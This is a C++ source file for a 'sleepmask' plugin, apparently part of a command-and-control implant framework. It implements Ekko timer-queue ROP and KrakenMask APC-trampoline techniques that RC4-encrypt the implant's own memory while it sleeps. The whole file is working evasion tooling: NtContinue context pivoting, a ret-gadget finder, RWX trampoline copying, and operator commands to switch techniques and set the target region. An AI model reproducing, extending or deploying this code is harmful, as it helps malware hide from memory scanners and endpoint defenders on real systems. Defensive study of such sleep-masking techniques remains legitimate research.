// sleepmask.cpp — Unified sleep mask plugin (Ekko + KrakenMask).
//
// Encrypts a target memory region with RC4 during sleep, then decrypts
// on wake. Supports two dispatch techniques:
//   - Ekko:   Timer-queue ROP chain (NtContinue pivots through system calls)
//   - Kraken: APC-based trampoline (callback copied outside encrypted region)
//
// Default technique is Ekko. Operator can switch at runtime.
//
// SELF-ENCRYPTION: Both techniques handle the case where the sleep mask's
// own code is INSIDE the encrypted region. The key design:
//   1. All control data (CONTEXT structs, crypto material, sync objects,
//      function pointers) lives in a heap-allocated SleepControlBlock
//      OUTSIDE the target region.
//   2. Ekko: ROP chain targets are system DLL functions (VirtualProtect,
//      SystemFunction032, etc.) — no plugin code runs while encrypted.
//   3. Kraken: The APC callback is memcpy'd to a separate VirtualAlloc'd
//      page before encryption. The copy survives encryption and calls
//      system functions through pointers in the control block.
//
// Commands (via execute):
//   "sleep <ms>"              — encrypt, sleep, decrypt
//   "set ekko"                — switch to Ekko technique
//   "set kraken"              — switch to KrakenMask technique
//   "target <base_hex> <size_hex>" — set the region to encrypt
//
// Requires x64 Windows. Incompatible with CET shadow stack.

#include <Windows.h>
#include <new>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include "../../Include/IPlugin.h"

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define RtlGenRandom SystemFunction036
extern "C" BOOLEAN NTAPI RtlGenRandom(PVOID RandomBuffer, ULONG RandomBufferLength);

// ─── NT API types ──────────────────────────────────────────────

typedef struct _USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

typedef NTSTATUS(NTAPI* NtContinue_t)(PCONTEXT, BOOLEAN);
typedef NTSTATUS(NTAPI* SystemFunction032_t)(USTRING*, USTRING*);

// Function pointer types for the control block (avoids IAT dependency)
typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE, DWORD);
typedef BOOL(WINAPI* SetEvent_t)(HANDLE);

// ─── Technique enum ────────────────────────────────────────────

enum class SleepTechnique : int { Ekko = 0, Kraken = 1 };

// ─── Control block (heap-allocated, survives image encryption) ─

struct alignas(16) SleepControlBlock {
    // Crypto
    BYTE    keyData[16];
    USTRING key;
    USTRING img;

    // Target region
    PVOID   imageBase;
    DWORD   imageSize;
    DWORD   ropOldProtect;
    DWORD   sleepMs;

    // Sync
    HANDLE  hEvtEncrypted;
    HANDLE  hEvtSleep;
    HANDLE  hEvtDone;

    // Ekko-specific
    HANDLE  hTimerQueue;

    // Kraken-specific
    HANDLE  hWorkerThread;
    PVOID   trampoline;       // RWX page holding the callback copy
    DWORD   trampolineSize;

    // ROP contexts (Ekko uses these, 8 slots)
    CONTEXT ropCtx[8];

    // Function pointers resolved from system DLLs.
    // Stored here so the trampoline/ROP chain can call them
    // even after the plugin's IAT is encrypted.
    NtContinue_t         fnNtContinue;
    SystemFunction032_t  fnSysFunc032;
    VirtualProtect_t     fnVirtualProtect;
    WaitForSingleObject_t fnWFSO;
    SetEvent_t           fnSetEvent;
};

// ─── Kraken trampoline ────────────────────────────────────────
//
// This function is memcpy'd to an external RWX allocation before
// the image is encrypted. It calls system functions ONLY through
// the control block's function pointers (never the IAT).
//
// Rules for position-independence:
//   - No string literals, no globals, no switch/jump tables
//   - All data accessed through the struct pointer parameter
//   - All function calls are indirect through control block
//   - Compiler pragmas suppress runtime checks that add
//     RIP-relative references to CRT helpers

#pragma optimize("", off)
#pragma runtime_checks("", off)

__declspec(noinline)
static void NTAPI KrakenTrampoline(ULONG_PTR param) {
    auto cb = (SleepControlBlock*)param;
    DWORD oldProt = 0;

    // Step 1: VirtualProtect → RW
    cb->fnVirtualProtect(cb->imageBase, cb->imageSize,
                         PAGE_READWRITE, &oldProt);

    // Step 2: RC4 encrypt
    cb->fnSysFunc032(&cb->img, &cb->key);

    // Step 3: Signal "encrypted" then sleep
    cb->fnSetEvent(cb->hEvtEncrypted);
    cb->fnWFSO(cb->hEvtSleep, cb->sleepMs);

    // Step 4: RC4 decrypt (symmetric)
    cb->fnSysFunc032(&cb->img, &cb->key);

    // Step 5: Restore protection
    cb->fnVirtualProtect(cb->imageBase, cb->imageSize,
                         PAGE_EXECUTE_READ, &oldProt);

    // Step 6: Signal done
    cb->fnSetEvent(cb->hEvtDone);
}

// Sentinel — used to estimate trampoline size at runtime.
// In Release builds with /O2, MSVC lays out noinline functions
// sequentially within a TU, so the delta is the function size.
__declspec(noinline)
static void NTAPI KrakenTrampolineEnd(ULONG_PTR) { }

#pragma runtime_checks("", restore)
#pragma optimize("", on)

// ─── Worker thread for Kraken ─────────────────────────────────
// Enters alertable wait; the queued APC (trampoline copy) fires here.
// Once the APC returns (after decrypt + restore), the thread exits.

static DWORD WINAPI KrakenWorker(LPVOID param) {
    auto cb = (SleepControlBlock*)param;
    (void)cb;
    SleepEx(INFINITE, TRUE); // alertable wait — APC fires here
    return 0;
}

// ─── Ret gadget finder ───────────────────────────────────────
// Locate a 0xC3 (ret) instruction in a module's executable sections.
// Used as a safe return address in the ROP chain: after each system
// function returns, it hits the ret gadget and harmlessly pops into
// whatever the timer dispatch left on the stack.

static PVOID FindRetGadget(HMODULE hMod) {
    if (!hMod) return NULL;
    auto base = (PBYTE)hMod;
    auto dos  = (PIMAGE_DOS_HEADER)base;
    auto nt   = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    auto sec  = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        PBYTE start = base + sec->VirtualAddress;
        SIZE_T size = sec->Misc.VirtualSize ? sec->Misc.VirtualSize
                                            : sec->SizeOfRawData;
        for (SIZE_T j = 0; j < size; j++) {
            if (start[j] == 0xC3) return &start[j];
        }
    }
    return NULL;
}

// ─── BuildRopContext ──────────────────────────────────────────
// Builds a CONTEXT that, when restored by NtContinue, executes:
//   fn(a1, a2, a3, a4)
// RSP is decremented by 8 (simulates CALL's return-address push)
// and a ret gadget address is placed at [RSP] so the function
// returns cleanly into a harmless 0xC3 in ntdll.

static PVOID g_retGadget = nullptr;

static CONTEXT BuildRopCtx(const CONTEXT& donor, PVOID fn,
                           ULONG_PTR a1 = 0, ULONG_PTR a2 = 0,
                           ULONG_PTR a3 = 0, ULONG_PTR a4 = 0) {
    CONTEXT c = donor;
    c.Rsp -= 8;
    *(ULONG_PTR*)c.Rsp = (ULONG_PTR)g_retGadget; // return address → ret gadget
    c.Rip = (DWORD64)fn;
    c.Rcx = a1;
    c.Rdx = a2;
    c.R8  = a3;
    c.R9  = a4;
    return c;
}

// ─── SleepMask plugin ─────────────────────────────────────────

class SleepMaskPlugin : public IPlugin {
    mutable SleepTechnique m_technique;
    mutable PVOID          m_imageBase;
    mutable DWORD          m_imageSize;
    mutable bool           m_configured;

    mutable NtContinue_t         m_fnNtContinue;
    mutable SystemFunction032_t  m_fnSysFunc032;
    mutable VirtualProtect_t     m_fnVirtualProtect;
    mutable WaitForSingleObject_t m_fnWFSO;
    mutable SetEvent_t           m_fnSetEvent;
    mutable bool                 m_resolved;

    const WinApiTable* m_api; // reserved for future WinApiTable-routed calls

public:
    explicit SleepMaskPlugin(const WinApiTable* api)
        : m_technique(SleepTechnique::Ekko)
        , m_imageBase(nullptr), m_imageSize(0)
        , m_configured(false)
        , m_fnNtContinue(nullptr), m_fnSysFunc032(nullptr)
        , m_fnVirtualProtect(nullptr), m_fnWFSO(nullptr)
        , m_fnSetEvent(nullptr)
        , m_resolved(false)
        , m_api(api) {}

    void init() const override {
        if (m_resolved) return;

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        HMODULE hK32   = GetModuleHandleA("kernel32.dll");
        HMODULE hAdv   = GetModuleHandleA("advapi32.dll");
        if (!hAdv) hAdv = LoadLibraryA("advapi32.dll");

        m_fnNtContinue     = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");
        m_fnSysFunc032     = (SystemFunction032_t)GetProcAddress(hAdv, "SystemFunction032");
        m_fnVirtualProtect = (VirtualProtect_t)GetProcAddress(hK32, "VirtualProtect");
        m_fnWFSO           = (WaitForSingleObject_t)GetProcAddress(hK32, "WaitForSingleObject");
        m_fnSetEvent       = (SetEvent_t)GetProcAddress(hK32, "SetEvent");

        m_resolved = (m_fnNtContinue && m_fnSysFunc032 &&
                      m_fnVirtualProtect && m_fnWFSO && m_fnSetEvent);

        if (!g_retGadget)
            g_retGadget = FindRetGadget(hNtdll);
    }

    void execute(TaskApi* task) const override {
        if (!task || !task->Command) return;

        if (strncmp(task->Command, "sleep ", 6) == 0) {
            DWORD ms = (DWORD)atoi(task->Command + 6);
            if (ms < 100) ms = 100;
            DoSleep(ms);
        }
        else if (strcmp(task->Command, "set ekko") == 0) {
            m_technique = SleepTechnique::Ekko;
            printf("[sleepmask] Technique set to Ekko\n");
        }
        else if (strcmp(task->Command, "set kraken") == 0) {
            m_technique = SleepTechnique::Kraken;
            printf("[sleepmask] Technique set to Kraken\n");
        }
        else if (strncmp(task->Command, "target ", 7) == 0) {
            char* end = nullptr;
            m_imageBase = (PVOID)strtoull(task->Command + 7, &end, 16);
            if (end && *end == ' ')
                m_imageSize = (DWORD)strtoul(end + 1, nullptr, 16);
            m_configured = (m_imageBase != nullptr && m_imageSize > 0);
            printf("[sleepmask] Target: %p size 0x%lx (%s)\n",
                   m_imageBase, m_imageSize,
                   m_configured ? "OK" : "INVALID");
        }
        else if (strncmp(task->Command, "test ", 5) == 0) {
            DWORD ms = (DWORD)atoi(task->Command + 5);
            if (ms < 100) ms = 500;
            DoTest(ms);
        }
        else if (strcmp(task->Command, "info") == 0) {
            printf("[sleepmask] Technique: %s | Target: %p (0x%lx) | %s\n",
                   m_technique == SleepTechnique::Ekko ? "Ekko" : "Kraken",
                   m_imageBase, m_imageSize,
                   m_configured ? "configured" : "NOT configured");
        }
        else if (strncmp(task->Command, "echo ", 5) == 0) {
            printf("[sleepmask] %s\n", task->Command + 5);
        }
        else {
            printf("[sleepmask] Commands: sleep <ms> | test <ms> | set ekko"
                   " | set kraken | target <base> <size> | echo <msg> | info\n");
        }
    }

    void cleanup() const override {}

private:
    // Allocate control block, dispatch to technique, clean up
    // Self-contained test: allocate a 4KB region of 0xCC, encrypt/sleep/decrypt,
    // verify it comes back intact. No external target needed.
    void DoTest(DWORD ms) const {
        if (!m_resolved) {
            printf("[sleepmask] NT APIs not resolved\n");
            return;
        }

        const DWORD sz = 4096;
        LPVOID region = VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!region) { printf("[sleepmask] Test alloc failed\n"); return; }
        memset(region, 0xCC, sz);
        DWORD oldProt;
        VirtualProtect(region, sz, PAGE_EXECUTE_READ, &oldProt);

        printf("[sleepmask] Test region: %p (0x%lx) = %02X %02X %02X %02X\n",
               region, sz,
               ((BYTE*)region)[0], ((BYTE*)region)[1],
               ((BYTE*)region)[2], ((BYTE*)region)[3]);

        // Temporarily set target to our test region
        PVOID savedBase = m_imageBase;
        DWORD savedSize = m_imageSize;
        bool  savedCfg  = m_configured;

        m_imageBase  = region;
        m_imageSize  = sz;
        m_configured = true;

        DoSleep(ms);

        // Restore
        m_imageBase  = savedBase;
        m_imageSize  = savedSize;
        m_configured = savedCfg;

        // Verify
        bool ok = (((BYTE*)region)[0] == 0xCC);
        printf("[sleepmask] After: %02X %02X %02X %02X — %s\n",
               ((BYTE*)region)[0], ((BYTE*)region)[1],
               ((BYTE*)region)[2], ((BYTE*)region)[3],
               ok ? "RESTORED" : "CORRUPT");

        VirtualFree(region, 0, MEM_RELEASE);
    }

    void DoSleep(DWORD ms) const {
        if (!m_resolved) {
            printf("[sleepmask] NT APIs not resolved\n");
            return;
        }
        if (!m_configured) {
            printf("[sleepmask] Target region not configured\n");
            return;
        }

        // Allocate control block OUTSIDE the target region
        auto cb = (SleepControlBlock*)VirtualAlloc(
            NULL, sizeof(SleepControlBlock),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!cb) {
            printf("[sleepmask] Control block alloc failed\n");
            return;
        }
        memset(cb, 0, sizeof(*cb));

        // CSPRNG key
        if (!RtlGenRandom(cb->keyData, sizeof(cb->keyData))) {
            VirtualFree(cb, 0, MEM_RELEASE);
            return;
        }

        cb->key       = { 16, 16, cb->keyData };
        cb->img       = { m_imageSize, m_imageSize, m_imageBase };
        cb->imageBase = m_imageBase;
        cb->imageSize = m_imageSize;
        cb->sleepMs   = ms;

        // Copy resolved function pointers into control block
        cb->fnNtContinue     = m_fnNtContinue;
        cb->fnSysFunc032     = m_fnSysFunc032;
        cb->fnVirtualProtect = m_fnVirtualProtect;
        cb->fnWFSO           = m_fnWFSO;
        cb->fnSetEvent       = m_fnSetEvent;

        // Create sync events
        cb->hEvtEncrypted = CreateEventA(NULL, TRUE, FALSE, NULL);
        cb->hEvtSleep     = CreateEventA(NULL, TRUE, FALSE, NULL);
        cb->hEvtDone      = CreateEventA(NULL, TRUE, FALSE, NULL);

        printf("[sleepmask] %s sleep (%lu ms) on %p [0x%lx]\n",
               m_technique == SleepTechnique::Ekko ? "Ekko" : "Kraken",
               ms, m_imageBase, m_imageSize);

        switch (m_technique) {
        case SleepTechnique::Ekko:   EkkoSleep(cb, ms); break;
        case SleepTechnique::Kraken: KrakenSleep(cb, ms); break;
        }

        // Cleanup
        if (cb->hTimerQueue)  DeleteTimerQueue(cb->hTimerQueue);
        if (cb->hWorkerThread) {
            WaitForSingleObject(cb->hWorkerThread, 5000);
            CloseHandle(cb->hWorkerThread);
        }
        if (cb->trampoline) {
            SecureZeroMemory(cb->trampoline, cb->trampolineSize);
            VirtualFree(cb->trampoline, 0, MEM_RELEASE);
        }
        if (cb->hEvtEncrypted) CloseHandle(cb->hEvtEncrypted);
        if (cb->hEvtSleep)     CloseHandle(cb->hEvtSleep);
        if (cb->hEvtDone)      CloseHandle(cb->hEvtDone);

        SecureZeroMemory(cb, sizeof(*cb));
        VirtualFree(cb, 0, MEM_RELEASE);
    }

    // ─── Ekko: Timer-queue ROP chain ──────────────────────────
    //
    // Each timer fires NtContinue with a CONTEXT that pivots RIP
    // to a system DLL function. The plugin's code never executes
    // during the encrypted window — only ntdll/kernel32/advapi32.

    void EkkoSleep(SleepControlBlock* cb, DWORD ms) const {
        cb->hTimerQueue = CreateTimerQueue();
        if (!cb->hTimerQueue) return;

        // Capture timer thread context (provides donor RSP)
        CONTEXT timerCtx = {};
        HANDLE hCapture = NULL;
        CreateTimerQueueTimer(&hCapture, cb->hTimerQueue,
            (WAITORTIMERCALLBACKFUNC)RtlCaptureContext, &timerCtx,
            0, 0, WT_EXECUTEINTIMERTHREAD);
        Sleep(200);

        if (timerCtx.Rip == 0) {
            printf("[sleepmask] Failed to capture timer context\n");
            return;
        }

        DWORD delay = 0;
        HANDLE hTimer = NULL;

        // ROP 1: VirtualProtect(image, RW)
        cb->ropCtx[0] = BuildRopCtx(timerCtx, (PVOID)cb->fnVirtualProtect,
            (ULONG_PTR)cb->imageBase, cb->imageSize,
            PAGE_READWRITE, (ULONG_PTR)&cb->ropOldProtect);
        CreateTimerQueueTimer(&hTimer, cb->hTimerQueue,
            (WAITORTIMERCALLBACKFUNC)cb->fnNtContinue, &cb->ropCtx[0],
            delay += 100, 0, WT_EXECUTEINTIMERTHREAD);

        // ROP 2: SystemFunction032(encrypt)
        cb->ropCtx[1] = BuildRopCtx(timerCtx, (PVOID)cb->fnSysFunc032,
            (ULONG_PTR)&cb->img, (ULONG_PTR)&cb->key);
        CreateTimerQueueTimer(&hTimer, cb->hTimerQueue,
            (WAITORTIMERCALLBACKFUNC)cb->fnNtContinue, &cb->ropCtx[1],
            delay += 100, 0, WT_EXECUTEINTIMERTHREAD);

        // ROP 3: SetEvent(encrypted)
        cb->ropCtx[2] = BuildRopCtx(timerCtx, (PVOID)cb->fnSetEvent,
            (ULONG_PTR)cb->hEvtEncrypted);
        CreateTimerQueueTimer(&hTimer, cb->hTimerQueue,
            (WAITORTIMERCALLBACKFUNC)cb->fnNtContinue, &cb->ropCtx[2],
            delay += 100, 0, WT_EXECUTEINTIMERTHREAD);

        // ROP 4: WaitForSingleObject(sleep event, ms)
        cb->ropCtx[3] = BuildRopCtx(timerCtx, (PVOID)cb->fnWFSO,
            (ULONG_PTR)cb->hEvtSleep, ms);
        CreateTimerQueueTimer(&hTimer, cb->hTimerQueue,
            (WAITORTIMERCALLBACKFUNC)cb->fnNtContinue, &cb->ropCtx[3],
            delay += 100, 0, WT_EXECUTEINTIMERTHREAD);

        // ROP 5: SystemFunction032(decrypt)
        cb->ropCtx[4] = BuildRopCtx(timerCtx, (PVOID)cb->fnSysFunc032,
            (ULONG_PTR)&cb->img, (ULONG_PTR)&cb->key);
        CreateTimerQueueTimer(&hTimer, cb->hTimerQueue,
            (WAITORTIMERCALLBACKFUNC)cb->fnNtContinue, &cb->ropCtx[4],
            delay += 100 + ms, 0, WT_EXECUTEINTIMERTHREAD);

        // ROP 6: VirtualProtect(restore RX)
        cb->ropCtx[5] = BuildRopCtx(timerCtx, (PVOID)cb->fnVirtualProtect,
            (ULONG_PTR)cb->imageBase, cb->imageSize,
            PAGE_EXECUTE_READ, (ULONG_PTR)&cb->ropOldProtect);
        CreateTimerQueueTimer(&hTimer, cb->hTimerQueue,
            (WAITORTIMERCALLBACKFUNC)cb->fnNtContinue, &cb->ropCtx[5],
            delay += 100, 0, WT_EXECUTEINTIMERTHREAD);

        // ROP 7: SetEvent(done)
        cb->ropCtx[6] = BuildRopCtx(timerCtx, (PVOID)cb->fnSetEvent,
            (ULONG_PTR)cb->hEvtDone);
        CreateTimerQueueTimer(&hTimer, cb->hTimerQueue,
            (WAITORTIMERCALLBACKFUNC)cb->fnNtContinue, &cb->ropCtx[6],
            delay += 100, 0, WT_EXECUTEINTIMERTHREAD);

        printf("[sleepmask] Ekko: ROP chain queued (%lu ms total)\n", delay);

        // Main thread waits — clean call stack (just WaitForSingleObject)
        WaitForSingleObject(cb->hEvtDone, ms + 10000);
        printf("[sleepmask] Ekko: cycle complete\n");
    }

    // ─── Kraken: APC trampoline ───────────────────────────────
    //
    // The trampoline function is copied to a separate RWX page
    // before any encryption happens. This copy survives image
    // encryption because it's at a different virtual address.
    // The APC fires on a worker thread in alertable wait.
    //
    // Detection difference from Ekko: no timer-queue objects
    // to enumerate, but APC queue inspection is possible.

    void KrakenSleep(SleepControlBlock* cb, DWORD ms) const {
        // Estimate trampoline size from the two sentinel functions.
        // In Release/O2, MSVC lays noinline functions sequentially.
        // We allocate a full page regardless — the estimate is a safety check.
        SIZE_T estSize = (BYTE*)KrakenTrampolineEnd - (BYTE*)KrakenTrampoline;
        if (estSize == 0 || estSize > 4096) estSize = 512;

        cb->trampolineSize = 4096;
        cb->trampoline = VirtualAlloc(NULL, cb->trampolineSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!cb->trampoline) {
            printf("[sleepmask] Trampoline alloc failed\n");
            return;
        }

        // Copy the callback to the external page
        memcpy(cb->trampoline, (void*)KrakenTrampoline, estSize);

        // Create worker thread (enters alertable wait immediately)
        cb->hWorkerThread = CreateThread(NULL, 0, KrakenWorker, cb,
                                         CREATE_SUSPENDED, NULL);
        if (!cb->hWorkerThread) {
            printf("[sleepmask] Worker thread creation failed\n");
            return;
        }

        // Queue APC pointing to the TRAMPOLINE COPY, not the original
        QueueUserAPC((PAPCFUNC)cb->trampoline, cb->hWorkerThread,
                     (ULONG_PTR)cb);

        // Resume — worker enters SleepEx, APC fires
        ResumeThread(cb->hWorkerThread);

        printf("[sleepmask] Kraken: APC queued, worker resumed\n");

        // Main thread waits — clean call stack
        WaitForSingleObject(cb->hEvtDone, ms + 10000);
        printf("[sleepmask] Kraken: cycle complete\n");
    }
};

// ─── Plugin exports ───────────────────────────────────────────

static IPlugin*          g_plugin = nullptr;
static const WinApiTable* g_api   = nullptr;

extern "C" __declspec(dllexport)
IPlugin* __stdcall create_plugin(const WinApiTable* api) {
    if (g_plugin) return g_plugin;
    g_api = api;
    HANDLE heap = api ? api->GetProcessHeap() : GetProcessHeap();
    auto alloc  = api ? api->HeapAlloc : ::HeapAlloc;
    void* mem = alloc(heap, HEAP_ZERO_MEMORY, sizeof(SleepMaskPlugin));
    if (!mem) return nullptr;
    g_plugin = ::new (mem) SleepMaskPlugin(api);
    return g_plugin;
}

extern "C" __declspec(dllexport)
void __stdcall destroy_plugin(IPlugin* p) {
    if (!p) return;
    p->~IPlugin();
    HANDLE heap = g_api ? g_api->GetProcessHeap() : GetProcessHeap();
    auto free_fn = g_api ? g_api->HeapFree : ::HeapFree;
    free_fn(heap, 0, p);
    if (p == g_plugin) g_plugin = nullptr;
}

extern "C" __declspec(dllexport)
void __stdcall plugin_init(IPlugin* p) {
    if (!p) p = create_plugin(g_api);
    if (p) p->init();
}

extern "C" __declspec(dllexport)
void __stdcall plugin_exec(TaskApi* task) {
    if (!g_plugin) g_plugin = create_plugin(task ? task->Api : nullptr);
    if (g_plugin) g_plugin->execute(task);
}

extern "C" __declspec(dllexport)
void __stdcall plugin_cleanup(IPlugin* p) {
    if (!p) p = g_plugin;
    if (p) p->cleanup();
}

PLUGIN_EXPORT PluginInfo PLUGIN_CALL plugin_info() {
    return { "sleepmask", "2.0.3",
             "Unified sleep mask (Ekko/Kraken) with full-image encryption" };
}
